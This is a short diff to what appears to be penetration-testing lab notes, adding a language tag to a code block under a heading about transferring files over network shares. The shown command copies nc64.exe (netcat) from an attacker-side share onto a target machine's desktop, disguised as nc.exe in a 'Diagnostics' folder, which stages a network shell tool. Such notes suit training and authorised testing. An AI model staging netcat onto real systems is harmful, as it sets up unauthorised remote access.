@@ -94,7 +94,7 @@ Note: You can access the share \\tsclient directly too
 
 **[+] Transfer files using network shares (Powershell)**
 
-```
+```powershell
 - You need to make a public share in your student's VM or your Kali
 
 Copy-Item –Path \\PA-USER1337\scripts\nc64.exe –Destination 'C:\Users\jumpsrvadmin\Desktop\Diagnostics\nc.exe'
